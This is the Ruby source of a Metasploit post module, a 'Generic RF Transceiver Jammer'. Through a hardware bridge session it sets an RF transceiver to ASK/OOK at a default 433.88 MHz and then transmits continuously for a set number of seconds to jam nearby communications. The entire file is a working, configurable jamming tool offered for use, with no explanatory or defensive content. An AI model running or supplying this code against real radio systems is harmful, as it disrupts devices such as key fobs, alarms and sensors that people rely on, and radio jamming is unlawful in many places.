class MetasploitModule < Msf::Post

  include Msf::Post::Hardware::RFTransceiver::RFTransceiver

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Generic RF Transceiver Jammer',
        'Description'   => %q{ Post Module for HWBridge RFTranscievers.  Blasts a desired packet
                               Over and over again.  Effectively jamming communications.
                               Code ported from AndrewMohak
                               https://github.com/AndrewMohawk/RfCatHelpers/blob/master/RFJammer.py },
        'License'       => MSF_LICENSE,
        'Author'        => ['Craig Smith'],
        'Platform'      => ['hardware'],
        'SessionTypes'  => ['hwbridge']
      ))
    register_options([
      OptInt.new('FREQ', [true, "Frequency to jam", 433880000]),
      OptInt.new('SECONDS', [false, "Seconds to jam", 15]),
      OptInt.new('BAUD', [false, "Baud rate to use", 4800]),
      OptInt.new('POWER', [false, "Power level", 100]),
      OptInt.new('INDEX', [false, "USB Index to use", 0])
    ], self.class)

  end

  def run
    if not is_rf?
      print_error("Not an RF Transceiver")
      return
    end
    if not set_index(datastore['INDEX'])
      print_error("Couldn't set usb index to #{datastore["INDEX"]}")
      return
    end
    set_modulation("ASK/OOK")
    set_freq(datastore["FREQ"])
    set_sync_mode(0)
    set_baud(datastore["BAUD"])
    set_channel_spc(24000)
    set_mode("idle")
    set_power(datastore["POWER"])

    print_status("Jamming #{datastore['FREQ']} for #{datastore['SECONDS']} seconds...")
    set_mode("tx")
    sleep(datastore['SECONDS'])
    print_status("Finished jamming")
    set_mode("idle")
  end

end
